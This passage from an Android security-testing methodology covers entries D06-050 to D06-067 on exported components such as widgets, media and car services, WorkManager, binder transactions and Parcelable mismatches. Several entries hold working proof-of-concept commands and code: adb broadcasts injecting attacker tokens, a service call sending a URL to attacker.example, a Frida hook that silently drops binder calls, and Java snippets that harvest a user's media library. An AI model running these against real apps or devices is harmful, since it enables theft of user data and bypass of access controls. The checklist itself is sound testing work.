- **Ruled out when:** The sensitive views set `importantForAutofill="no"` or `noExcludeDescendants`, or the
  screen sets `FLAG_SECURE` — demonstrate with an empty `uiautomator dump` for that screen.

### D06-050 · `TileService` action performed while the device is locked

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.bypass_of_password_confirmation.change_password` (P4) shape for a state toggle; rate higher via `broken_access_control.privilege_escalation` (null) when the tile performs a financial or data-revealing action |
| **Attacker** | AM-10 (physical access, device locked) — check the programme's rules before spending time here |
| **Applies to** | API 24+ for `TileService`; the `startActivityAndCollapse(PendingIntent)` form is API 34+ |
| **Maps to** | `develop/ui/views/quicksettings-tiles` — "Your tile may display on top of the lock screen on locked devices", with `isLocked()`/`isSecure()`/`unlockAndRun(Runnable)` as the required guards; MASWE-0023 (Step-Up Authentication Not Implemented) |

- **Test:** A Quick Settings tile can be tapped on the lock screen. A tile that performs a privileged
  action in `onClick()` — start a transfer, reveal a balance, toggle a security feature, launch an
  activity showing account data — without an `isLocked()` guard is exploitable by anyone with brief
  physical access.
- **How:**
```bash
grep -nA8 'android.service.quicksettings.action.QS_TILE' base_apktool/AndroidManifest.xml
grep -rnE 'class .*TileService|onClick\(|isLocked\(|isSecure\(|unlockAndRun|startActivityAndCollapse' out/sources/
adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP
adb shell cmd statusbar expand-settings
adb shell uiautomator dump /sdcard/lock.xml && adb pull /sdcard/lock.xml
```
- **Proof:** The action completing, or the launched activity rendering its content, with the keyguard still
  displayed. The `uiautomator dump` taken while locked, showing the app's own view hierarchy, is the
  screenshot-independent artefact.
- **Escalation:** Pairs with the home-screen widget surface (D06-052) for a lock-screen-only disclosure
  chain; → D13 step-up-authentication finding.
- **Ruled out when:** `onClick()` calls `isLocked()`/`isSecure()` and routes the action through
  `unlockAndRun()`, verified by tapping while locked and seeing the keyguard challenge.

### D06-051 · Exported `SliceProvider` whose `onBindSlice` acts on the URI

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); `broken_access_control.privilege_escalation` (null) for an unauthenticated state change |
| **Attacker** | AM-03 |
| **Applies to** | Apps shipping AndroidX Slices — declining in prevalence, so almost never reviewed |
| **Maps to** | `guide/slices/getting-started` (provider XML, `android.app.slice.category.SLICE`, `onBindSlice`); MASWE-0036 |

- **Test:** The documented setup exports the provider (`android:exported="true"` with
  `<category android:name="android.app.slice.category.SLICE" />`) on the stated basis that "all permission
  checks are handled internally". That holds for *slice permission*, not for anything the provider does
  with the URI. A provider that branches on `sliceUri.path` and performs I/O, network calls or state
  changes is reachable by any app that can obtain slice permission, and by the app's own hosts.
- **How:**
```bash
grep -nB2 -A10 'android.app.slice.category.SLICE' base_apktool/AndroidManifest.xml
grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|grantSlicePermission|checkSlicePermission' out/sources/
adb shell content query --uri 'content://com.target.app/hello'
```
- **Proof:** Non-idempotent behaviour observable from a bind — a network request in the proxy log, a file
  written, or account data returned in the slice's row titles and subtitles.
- **Escalation:** Slice content is rendered by the Assistant, so the disclosure crosses to a third party;
  a `PendingIntent` inside the slice is a D08 finding.
- **Ruled out when:** `onBindSlice` is a pure function of already-public state and calls
  `checkSlicePermission()` before returning anything account-scoped.

### D06-052 · `AppWidgetProvider` accepts a forged `APPWIDGET_UPDATE` or custom action

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the handler exfiltrates the cached session token |
| **Attacker** | AM-03 |
| **Applies to** | All apps shipping a home-screen widget |
| **Maps to** | `develop/ui/views/appwidgets` (the receiver is declared `android:exported="true"` with the `APPWIDGET_UPDATE` filter); `privacy-and-security/risks/insecure-broadcast-receiver`; MASWE-0018 |

- **Test:** An `AppWidgetProvider` is a `BroadcastReceiver` that **must** be exported so the system can
  drive it. Its `onReceive`/`onUpdate` therefore accepts `android.appwidget.action.APPWIDGET_UPDATE` and
  any custom action the provider adds, from any app. Widget providers routinely hold a cached session
  token to render "logged-in" content, and their custom actions are rarely authenticated.
- **How:**
```bash
grep -nB2 -A12 'android.appwidget.action.APPWIDGET_UPDATE' base_apktool/AndroidManifest.xml
grep -rnE 'extends AppWidgetProvider|onReceive\(|onUpdate\(|intent\.getAction\(\)' out/sources/
adb shell am broadcast -n com.target.app/.MyWidgetProvider \
  -a com.target.app.widget.ACTION_REFRESH --es token "ATTACKER" --ei appWidgetId 1
adb shell dumpsys appwidget | grep -A10 com.target.app
```
- **Proof:** Logcat or a network capture showing the widget code path executing with your extras — an
  outbound request carrying `token=ATTACKER`, or `dumpsys appwidget` showing the state changed.
- **Escalation:** → D08 (the `RemoteViews` the provider builds carry `PendingIntent`s); → D05 for the
  broadcast-side analysis; → D20 if the widget renders account data on an unlocked home screen.
- **Ruled out when:** `onReceive` handles only the framework actions and ignores extras it did not set, or
  every custom action is guarded by a `signature`-level permission on the `<receiver>`.

### D06-053 · `MediaBrowserService` with no `onGetRoot` package validation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when media ids are directly fetchable |
| **Attacker** | AM-03 |
| **Applies to** | All apps with media playback; **any targetSdk** — the intent filter *is* the export, so the targetSdk 31 explicit-export rules do not close it |
| **Maps to** | `guide/topics/media-apps/audio-app/building-a-mediabrowserservice` — action `android.media.browse.MediaBrowserService`; "If the method returns null, the connection is refused"; "(Optional) Control the level of access for the specified package name. You'll need to write your own logic to do this"; `PackageValidator` in the `android/uamp` sample; MASWE-0018 |

- **Test:** Any app with audio or video playback that supports Android Auto, Wear, Assistant or system
  media controls declares this service, and the filter makes it reachable by **any** installed app. The
  only access control is the developer's own logic in `onGetRoot(clientPackageName, clientUid, rootHints)`
  — and the guide explicitly makes that ACL optional.
- **How:**
```bash
grep -n 'android.media.browse.MediaBrowserService' base_apktool/AndroidManifest.xml
grep -rnE 'onGetRoot|BrowserRoot|onLoadChildren|PackageValidator|MediaSessionCompat|onCommand|onCustomAction|sendCustomAction' out/sources/
```
```java
MediaBrowserCompat mb = new MediaBrowserCompat(this,
    new ComponentName("com.target.app", "com.target.app.media.PlaybackService"),
    new MediaBrowserCompat.ConnectionCallback() {
      public void onConnected() {
        Log.i("POC", "root=" + mb.getRoot());
        mb.subscribe(mb.getRoot(), new MediaBrowserCompat.SubscriptionCallback() {
          public void onChildrenLoaded(String p, List<MediaBrowserCompat.MediaItem> kids) {
            for (MediaBrowserCompat.MediaItem k : kids)
              Log.i("POC", k.getMediaId() + " | " + k.getDescription());
          }});
        MediaControllerCompat c = new MediaControllerCompat(ctx, mb.getSessionToken());
        c.getTransportControls().sendCustomAction("com.target.app.ACTION_X", null);
      }}, null);
mb.connect();
```
- **Proof:** `onConnected` firing from an unrelated package and `onChildrenLoaded` returning the signed-in
  user's library — playlist names, purchased or downloaded titles, "continue watching" entries, or media
  ids that embed signed URLs. Second proof: a `sendCustomAction` the app handles.
- **Escalation:** Custom actions are an untyped command channel into a service running as the app — fuzz
  the action names and bundles for the same class of bugs as an exported `Messenger` (D06-032).
- **Ruled out when:** `onGetRoot` returns `null` for an unknown `clientPackageName`/`clientUid` pair,
  validated against a signature-checked allow-list (the `PackageValidator` pattern) — demonstrate by
  connecting from an unrelated package and seeing the connection refused.

### D06-054 · `CarAppService` shipped with `ALLOW_ALL_HOSTS_VALIDATOR`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); `broken_access_control.privilege_escalation` (null) for the command channel |
| **Attacker** | AM-03 |
| **Applies to** | Any app shipping an Android for Cars integration (categories `androidx.car.app.category.NAVIGATION` / `.POI` / `.IOT` / `.WEATHER`) |
| **Maps to** | `training/cars/apps` — the docs name `createHostValidator()` and `HostValidator.ALLOW_ALL_HOSTS_VALIDATOR` and explicitly warn to validate the binding host; MASWE-0018 |

- **Test:** An Android Auto integration exposes `CarAppService` with
  `<action android:name="androidx.car.app.CarAppService" />` and `android:exported="true"`. The library's
  gate is `createHostValidator()`, deciding *which host* may bind. Shipping `ALLOW_ALL_HOSTS_VALIDATOR`
  means any app on the phone can bind and drive the car session — a surface no phone-app checklist covers.
- **How:**
```bash
grep -nB2 -A10 'androidx.car.app.CarAppService' base_apktool/AndroidManifest.xml
grep -rnE 'createHostValidator|HostValidator|ALLOW_ALL_HOSTS_VALIDATOR|addAllowedHosts' out/sources/
```
```java
Intent i = new Intent("androidx.car.app.CarAppService").setPackage("com.target.app");
bindService(i, conn, Context.BIND_AUTO_CREATE);
```
- **Proof:** `onServiceConnected` firing in the unprivileged binder and `onCreateSession()` running in the
  target — visible as the app's car-session lifecycle logs with your package as the client.
- **Escalation:** The car session typically renders account-scoped data (trips, vehicles, saved places,
  payment methods) and accepts navigation/POI commands → session data read, then command injection into
  navigation.
- **Ruled out when:** `createHostValidator()` returns a validator built from an explicit allow-list of
  host package names **with** their signing certificates, and the bind from an unrelated package is
  rejected.

### D06-055 · `WearableListenerService` path routing with no node or capability verification

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a path carries a "user authenticated" claim the phone trusts |
| **Attacker** | AM-03 |
| **Applies to** | Any app with a Wear OS companion. The Data Layer is Android-phone-only, so the path set is often *less* tested than the main app's API. |
| **Maps to** | `training/wearables/data/data-layer` and `.../data/messages` (`DataClient`, `MessageClient`, `WearableListenerService`, `sendMessage(nodeId, path, data)`); MASWE-0018, MASWE-0032 |

- **Test:** The Wear Data Layer delivers `DataItem`s and messages addressed by **path** (`/sync`, `/auth`,
  `/logout`). The receiving service is exported so Google Play services can bind it. Test whether
  `onMessageReceived`/`onDataChanged` dispatches on path alone without checking `getSourceNodeId()` against
  a known, capability-verified node.
- **How:**
```bash
grep -nB2 -A12 'com.google.android.gms.wearable' base_apktool/AndroidManifest.xml
grep -rnE 'onMessageReceived|onDataChanged|getSourceNodeId|getPath\(\)|CapabilityClient|getCapability' out/sources/
```
  The `<data android:scheme="wear" android:host="*" android:pathPrefix="/..."/>` filters enumerate the
  **complete undocumented API** of the phone↔watch channel — write them all down.
- **Proof:** A `when (messageEvent.path)` / `if (path.startsWith(...))` dispatch with no
  `getSourceNodeId()` comparison anywhere in the method. Demonstrate impact by delivering the same path
  with attacker-chosen `getData()` bytes and observing the phone app act on it.
- **Escalation:** These paths commonly carry "the watch says the user authenticated", "push this token"
  and "start this payment", and the phone side trusts them implicitly → D13.
- **Ruled out when:** Every handler compares `getSourceNodeId()` against a node obtained from
  `CapabilityClient` for the app's own capability, and rejects unknown nodes.

### D06-056 · `ChooserTargetService` — LEGACY, but still shipping in old code

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-03 when the bind permission is missing; otherwise the finding is the data the targets disclose |
| **Applies to** | **LEGACY — deprecated at API 30**, superseded by sharing shortcuts / `ShortcutManager` Direct Share. Live only where the app still declares it. |
| **Maps to** | Local senior-researcher corpus, "privileged listener/service surfaces — validated action, unvalidated caller"; MASWE-0018, MASWE-0036 |

- **Test:** A `ChooserTargetService` returns Direct Share targets to the system chooser. Two questions:
  is it guarded by `BIND_CHOOSER_TARGET_SERVICE`, and what do the returned targets disclose? Chooser
  targets carry an icon, a label and a `Bundle` — and apps routinely put the contact's name, photo and
  conversation id in them.
- **How:**
```bash
grep -nB4 -A10 'android.service.chooser.ChooserTargetService' base_apktool/AndroidManifest.xml
grep -rnE 'extends ChooserTargetService|onGetChooserTargets|new ChooserTarget\(' out/sources/ -A15
```
  If the bind permission is absent, bind with the declared action from a zero-permission app and call
  `onGetChooserTargets`.
- **Proof:** The returned `ChooserTarget` list logged in your PoC, containing recent contacts,
  conversation identifiers or account labels that your app has no permission to read.
- **Escalation:** → D20 (contact-graph disclosure); the `Bundle` in each target is also a D08 candidate if
  it carries a `PendingIntent`.
- **Ruled out when:** The service is absent from the merged manifest (the app has migrated to sharing
  shortcuts), or it declares `android:permission="android.permission.BIND_CHOOSER_TARGET_SERVICE"` and
  returns only non-account-scoped targets.

### D06-057 · `androidx.startup.InitializationProvider` — the pre-authentication code path nobody wrote

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); the install-collision variant is availability only |
| **Attacker** | AM-08 (an SDK's initializer) for the code path; AM-03 for the authority-collision hypothesis |
| **Applies to** | Any app using AndroidX App Startup, Firebase or WorkManager |
| **Maps to** | `topic/libraries/app-startup` (provider XML, authority format `${applicationId}.androidx-startup`, documented `android:exported="false"`); MASWE-0069 |

- **Test:** Every `<meta-data android:name="com.example.SomeInitializer" android:value="androidx.startup" />`
  names a class that runs in `InitializationProvider.onCreate()` — **before the launcher Activity, before
  any PIN or biometric gate**. Enumerate them and read what each does: an initializer that reads an
  account identifier and posts it to an analytics endpoint runs pre-authentication, on every cold start,
  regardless of whether the user ever unlocks the app.
- **How:**
```bash
grep -nB2 -A2 'androidx.startup' base_apktool/AndroidManifest.xml
adb shell dumpsys package com.target.app | sed -n '/Provider Resolver Table/,/^$/p'
# read each named initializer
grep -rn 'implements Initializer\|class .*Initializer' out/sources/ -A25
```
  The collision variant is a **hypothesis, not a fact** — run the experiment before reporting it:
```bash
adb install attacker-authority.apk     # declares authorities="com.target.app.androidx-startup"
adb install target.apk                 # observe INSTALL_FAILED_CONFLICTING_PROVIDER or success
adb shell dumpsys package providers | grep androidx-startup
```
- **Proof:** For the pre-auth path: a proxy capture taken between cold start and the unlock screen showing
  the initializer's request. For the collision: the exact installer failure string from step 2 — refuted
  if the install succeeds.
- **Escalation:** → D20 (collection before consent), → D18 (an SDK initializer is where third-party config
  is read).
- **Ruled out when:** Every initializer does only lazy wiring with no network or storage I/O, verified by
  reading the bodies; and the collision experiment returns "install succeeded", which refutes the
  hypothesis on that build.

### D06-058 · `JobService` missing `BIND_JOB_SERVICE`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All apps using `JobScheduler` or WorkManager (which contributes `SystemJobService`) |
| **Maps to** | `reference/android/app/job/JobScheduler` (`BIND_JOB_SERVICE`, `setPersisted` + `RECEIVE_BOOT_COMPLETED`, `setExtras` persisted vs `setTransientExtras` in-memory); `about/versions/14/behavior-changes-14` (`ACCESS_NETWORK_STATE` now required for `setRequiredNetworkType()`/`setRequiredNetwork()` or `SecurityException`; ANR on `onStartJob`/`onStopJob` overrun); MASWE-0018 |

- **Test:** `JobScheduler` requires `android:permission="android.permission.BIND_JOB_SERVICE"` on the
  `JobService` so that only the system can bind it. Without it, any app binds the service directly and
  calls `onStartJob(JobParameters)` with parameters it fabricated — including the job's extras.
- **How:**
```bash
xmllint --format base_apktool/AndroidManifest.xml \
  | grep -n -A4 -iE 'androidx.work|InitializationProvider|SystemJobService|RescheduleReceiver|DiagnosticsReceiver|BIND_JOB_SERVICE|extends.*JobService'
grep -rn 'extends JobService\|onStartJob\|onStopJob' out/sources/ -A20
adb shell dumpsys jobscheduler | grep -A15 com.target.app
```
- **Proof:** A `JobService` in the merged manifest with `exported="true"` (or an intent filter) and no
  `BIND_JOB_SERVICE`, plus your PoC binding it and the job body executing with your `JobParameters`.
- **Escalation:** → D06-060 (the job's input data is then attacker-controlled); → D11 if the job writes.
- **Ruled out when:** Every `JobService` in the merged manifest declares `BIND_JOB_SERVICE` — check the
  merged manifest, because library-contributed job services are the common miss.

### D06-059 · WorkManager's persisted `WorkSpec` input and its injected components

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a live token is recovered from the persisted input; `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the storage fact alone |
| **Attacker** | AM-03 only once the reach is proved (see the escalation); AM-11/AM-12 for the observation |
| **Applies to** | All apps using WorkManager |
| **Maps to** | `topic/libraries/architecture/workmanager` (SQLite persistence and the injected components); MASTG-TEST-0007 |

- **Test:** WorkManager persists work in an internal SQLite database that survives reboot, and its manifest
  contributes `androidx.startup.InitializationProvider`, `SystemJobService`, a reschedule
  `BroadcastReceiver` and a diagnostics `BroadcastReceiver`. Two testable questions: are any of these
  exported, and does the persisted input `Data` blob contain secrets?
- **How:**
```bash
adb shell run-as com.target.app find . -iname '*work*db*' -o -iname '*.db' | head
adb shell run-as com.target.app sh -c 'sqlite3 databases/androidx.work.workdb "select id,worker_class_name,quote(input) from WorkSpec limit 20;"'
adb shell dumpsys jobscheduler | grep -A15 com.target.app
adb shell am broadcast -n com.target.app/androidx.work.diagnostics.DiagnosticsReceiver
```
- **Proof:** A bearer token, refresh token or credential visible in the `input` blob of a `WorkSpec` row,
  **and** that token still authenticating against the production API. Locate the database by search, not
  by assuming a filename.
- **Escalation:** Storage alone is P5 (the sandbox protects it). It becomes a finding when a
  zero-permission app can reach it — via D06-029, an exported provider (D07), or a backup (D11). File the
  reach primitive as the finding and the stored secret as its impact.
- **Ruled out when:** The persisted `input` carries only opaque identifiers the backend resolves against
  the caller's session, and the diagnostics/reschedule receivers are `exported="false"` in the merged
  manifest.

### D06-060 · `WorkManager` / `AlarmManager` job input hijack from an exported entry point

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the delayed request carries the victim's token to your host |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASWE-0018; cross-reference D05 (the receiver entry point) and D14 (the endpoint) |

- **Test:** Where background work is scheduled with input data that originates from an Intent, check
  whether an attacker can schedule or influence the job — an attacker-chosen URL, user id or "retry"
  payload that later executes with the app's credentials. The delay is what makes this valuable: the
  request fires after your app is gone.
- **How:**
```bash
grep -rnE 'OneTimeWorkRequest|PeriodicWorkRequest|setInputData|Data\.Builder|setExact|setRepeating|PendingIntent\.getBroadcast' out/sources/ -B6 -A10
adb shell dumpsys jobscheduler | sed -n '/com.target.app/,/^$/p'
adb shell dumpsys alarm | grep -A5 com.target.app
```
  Drive the exported entry point with your value, then read the queued job back.
- **Proof:** A queued job in `dumpsys jobscheduler` whose input data contains your injected value,
  followed by the resulting outbound request captured in Burp with the victim's auth header.
- **Escalation:** → D14 (token exfiltration to your host), → D15.
- **Ruled out when:** Job input is built only from app-internal state, or every value that reaches
  `setInputData` is validated against an allow-list at scheduling time — show the validation and a
  rejected injection attempt.

### D06-061 · `androidx.work.multiprocess` — `RemoteWorkerService` is a bound service with a parcel boundary

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Any app declaring `android:process` or using multiprocess WorkManager |
| **Maps to** | Corpus note that the `androidx/work/multiprocess/RemoteWorkerService` reference page did not render — **verify the class's declaration in the merged manifest of the app under test rather than citing documented behaviour**; michalbednarski/ReparcelBug2 (CVE-2021-0928) and TheLastBundleMismatch (CVE-2023-45777) for the mismatch class |

- **Test:** Multiprocess WorkManager exposes a bound service so one process can enqueue work in another.
  Two questions: is that service exported in the merged manifest, and does the app pass its **own**
  `Parcelable`s across that boundary (which reproduces, inside one app, the exact conditions of the
  framework parcel-mismatch bug class — validate in one process, execute in another)?
- **How:**
```bash
grep -n 'android:process' base_apktool/AndroidManifest.xml
grep -rn 'androidx.work.multiprocess\|RemoteWorkManager\|RemoteListenableWorker\|RemoteWorkerService' out/sources/ base_apktool/AndroidManifest.xml
grep -rln 'implements Parcelable' out/sources/ | xargs grep -ln 'catch'
```
- **Proof:** The service's manifest entry showing `exported="true"` with no permission, plus a bind from a
  zero-permission app; or, for the mismatch variant, `Parcel.dataPosition()` after `createFromParcel`
  differing from `dataSize()` in a harness (D06-066).
- **Escalation:** → D06-066; → D17 when the enqueued worker class name is caller-controllable.
- **Ruled out when:** The multiprocess service is absent from the merged manifest, or declares a
  `signature`-level permission, and no app-defined `Parcelable` crosses the boundary.

### D06-062 · `JobIntentService` entry points — LEGACY, and still the enqueue path in old builds

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY** — deprecated in favour of `WorkManager`; live wherever an app still ships a `JobIntentService` subclass |
| **Maps to** | Local senior-researcher corpus (exported `WorkManager`/`JobIntentService` entry points listed among the privileged listener surfaces); MASWE-0018 |

- **Test:** `JobIntentService.enqueueWork(context, cls, jobId, intent)` hands the service an `Intent` that
  `onHandleWork(Intent)` consumes. If the subclass is exported (or the enqueue is reachable from an
  exported receiver), `onHandleWork` is an unauthenticated handler with the full extras surface of
  D06-027 — and it runs deferred, so the caller is long gone by the time it executes.
- **How:**
```bash
grep -rn 'extends JobIntentService\|onHandleWork\|enqueueWork(' out/sources/ -A25
grep -nB4 -A10 'JobIntentService\|BIND_JOB_SERVICE' base_apktool/AndroidManifest.xml
adb shell am startservice -n com.target.app/.MyJobIntentService --es url https://attacker.example
```
- **Proof:** `onHandleWork` executing with your extras — the deferred outbound request at your listener,
  or the file written — with the PoC app holding no permissions.
- **Escalation:** Same as D06-027 and D06-028; the deferral makes attribution harder for the victim, which
  is worth stating.
- **Ruled out when:** No `JobIntentService` subclass exists in the merged manifest, or the subclass
  declares `BIND_JOB_SERVICE` and `onHandleWork` ignores caller-supplied extras.

### D06-063 · A security decision implemented as a `oneway` transaction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4) when a "revoke"/"logout" call can be dropped; `broken_access_control.privilege_escalation` (null) when the dropped call is a lock or entitlement revocation |
| **Attacker** | AM-03 (must be able to interpose, typically via D06-042) or AM-08 |
| **Applies to** | All |
| **Maps to** | AOSP "Binder threading" — one-way calls return immediately; ordering is guaranteed only within a single interface; the driver reserves a separate async area. `android.os.Binder.FLAG_ONEWAY`. |

- **Test:** A `oneway` call returns immediately and the caller learns nothing about success. Security-
  relevant state changes implemented as `oneway` cannot be confirmed by the caller and can be silently
  dropped — so the caller's code continues on the success path with the state unchanged.
- **How:**
```bash
grep -rnE '^\s*oneway |oneway void |FLAG_ONEWAY' out/ base_apktool/ -r
```
  Runtime — watch for `FLAG_ONEWAY` (=1) on `transact`, then drop the call and see what the caller does:
```js
Java.perform(function () {
  var BP = Java.use('android.os.BinderProxy');
  BP.transact.implementation = function (code, data, reply, flags) {
    console.log('transact code=' + code + ' flags=' + flags + (flags & 1 ? ' ONEWAY' : '') +
                ' dataSize=' + data.dataSize());
    if ((flags & 1) && code === TARGET_CODE) { return true; }   // drop it, report success
    return this.transact(code, data, reply, flags);
  };
});
```
- **Proof:** The caller proceeding down its success path (UI shows "signed out", the log says "revoked")
  while the server-side state is unchanged — demonstrated by a subsequent authenticated request
  succeeding.
- **Escalation:** → D13 (a session that survives logout); pair with D06-064 for a targeted denial of the
  async transaction space.
- **Ruled out when:** Every security-relevant state change is a synchronous transaction whose return value
  the caller checks, or the state change is confirmed by a subsequent read — show the read.

### D06-064 · Transaction-buffer exhaustion and a fail-open `TransactionTooLargeException` catch

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) for the availability effect; `broken_access_control.privilege_escalation` (null) when the exception path is a fail-open branch |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | `android.os.TransactionTooLargeException` javadoc: "The Binder transaction buffer has a limited fixed size, currently 1MB, which is shared by all transactions in progress for the process… this exception can be thrown when there are many transactions in progress even when most of the individual transactions are of moderate size." |

- **Test:** The transaction buffer is a fixed ~1 MB region **shared by all in-flight transactions of a
  process**. An attacker who can make the target hold many or large transactions makes unrelated,
  legitimate transactions in that process fail. The finding is rarely the DoS — it is what the app's
  `catch` block does.
- **How:**
```bash
grep -rn 'TransactionTooLargeException\|catch (RemoteException\|DeadObjectException' out/sources/ -A8
```
  Drive it against an exported method taking a `byte[]`/`String`/`Bundle`:
```java
byte[] big = new byte[900 * 1024];
for (int i = 0; i < 8; i++)
    new Thread(() -> { try { svc.method(big); } catch (Throwable t) { Log.w("POC", "" + t); } }).start();
```
```bash
adb logcat | grep -E 'TransactionTooLarge|!!! FAILED BINDER TRANSACTION'
```
- **Proof:** The logcat failures, **plus** the app's catch block falling through to an insecure default —
  skipping a check, returning cached data, or treating the failure as "allowed". An entitlement check that
  `return true` on `RemoteException` is the shape to hunt.
- **Escalation:** The fail-open branch → whatever the check guarded → D13/D23.
- **Ruled out when:** Every `catch (RemoteException|TransactionTooLargeException)` fails closed (returns
  the denied value or rethrows), read from the decompiled body.

### D06-065 · A `ParcelFileDescriptor` returned over binder is a live FD in your process

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) for a sandbox-crossing read; `server_side_injection.remote_code_execution_rce` (P1) when the FD is writable and the file is later loaded |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | AOSP "Binder IPC" (a `Parcel` carries active objects — binder references and file descriptors); `ParcelFileDescriptor` as the standard AIDL FD carrier; MASTG-TEST-0007 |

- **Test:** A service returning a `ParcelFileDescriptor` hands the caller a kernel FD with whatever access
  mode it was opened with. Look for FDs opened `MODE_READ_WRITE` on a file the caller should only read,
  FDs onto a directory or a `/proc` path, and FDs that outlive the intended operation.
- **How:**
```bash
grep -rnE 'ParcelFileDescriptor\.(open|dup|adoptFd|fromSocket|createPipe)|writeFileDescriptor|openFileDescriptor|MODE_READ_WRITE|MODE_WORLD' out/sources/
# after the bind + call, inspect what you were handed
adb shell ls -l /proc/$(adb shell pidof com.poc.attacker)/fd/
```
- **Proof:** `ls -l /proc/<attacker pid>/fd/` showing a symlink into `/data/data/com.target.app/…` that
  your UID could never `open()` directly, plus a successful `read()` (and, for the writable case, a
  `write()`) through that FD with the bytes shown.
- **Escalation:** A writable FD into the app's own data directory is a stored-injection primitive — write
  a `.dex`/`.jar` the app loads (→ D17) or overwrite a config the app trusts (→ D11).
- **Ruled out when:** Every returned FD is opened read-only on a file whose contents the caller could
  already obtain, or the method returns no FD at all — list the methods you checked.

### D06-066 · The app's own `Parcelable` has a `writeToParcel`/`createFromParcel` mismatch

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null); Critical when it turns a validated object into a different one after the boundary |
| **Attacker** | AM-03 |
| **Applies to** | Any app that passes its own `Parcelable`s across a process boundary — a `:remote` service, multiprocess WorkManager, widget `RemoteViews`, or AIDL |
| **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** ("a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration`"); michalbednarski/LeakValue — **CVE-2022-20452**; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777** (bypass of Android 13's Lazy Bundle mitigation because `AccountManagerService.checkKeyIntent()` used the untyped `bundle.getParcelable(KEY_INTENT)`); MASWE-0050 |

- **Test:** It is the `Parcelable` implementation's responsibility to ensure `createFromParcel` reads the
  same number of bytes `writeToParcel` wrote. When they diverge — a `catch` in `createFromParcel` that
  swallows an exception mid-read, or a field added to the writer and not the reader — the unread bytes are
  interpreted as the *next* object, and an attacker who controls one field smuggles a different object
  into a later field, past whatever validation ran in between.
- **How:**
```bash
grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read f; do
  echo "== $f"
  sed -n '/writeToParcel/,/}/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\('
  sed -n '/createFromParcel/,/}/p;/protected .*(Parcel/,/}/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\('
done
# the four warning signs from ReparcelBug2
grep -rn 'createFromParcel' out/sources/ -A25 | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
```
  A write-count differing from the read-count for the same class, or a `catch` that does not rethrow, is
  the candidate.
- **Proof:** In a harness, write the class to a `Parcel` and read it back: `Parcel.dataPosition()` after
  `createFromParcel` differing from `dataSize()` proves the mismatch. Then demonstrate that a following
  field in the same `Bundle` decodes to an attacker-chosen value, with `getClass()` differing on each side.
- **Escalation:** → D17; in an app this bypasses whatever the validating process checked.
- **Ruled out when:** Read and write counts match for every app-defined `Parcelable`, no
  `createFromParcel` swallows an exception, and untyped `readParcelable`/`getParcelable` calls are replaced
  with the class-constrained forms.

### D06-067 · `isolatedProcess` — a real containment boundary, in both directions

| | |
|---|---|
| **Severity ceiling** | Medium — standalone; it is the amplifier for a D16 memory-safety finding |
| **VRT** | n/a standalone — it modifies the rating of a memory-safety finding |
| **Attacker** | n/a |
| **Applies to** | Android 4.1+ |
| **Maps to** | `guide/topics/manifest/service-element` (`isolatedProcess`); AOSP security-model paper Table 2 (Android 4.1): "Isolated process: Apps may run services in a process with no Android permissions and access to only two binder services. For example, the Chrome browser runs its renderer in an isolated process", mitigating [T.A3][T.A2][T.A5][T.A6][T.A7]; SELinux `isolated_app` domain |

- **Test:** `android:isolatedProcess="true"` is the correct container for parsing untrusted input (media,
  archives, native decoders): the process has no permissions of its own and access to only two binder
  services. Its **absence** around a native parser is the finding; its **presence** is not a bypassable
  control, and claiming otherwise gets a report rejected.
- **How:**
```bash
grep -nE 'isolatedProcess|externalService' base_apktool/AndroidManifest.xml
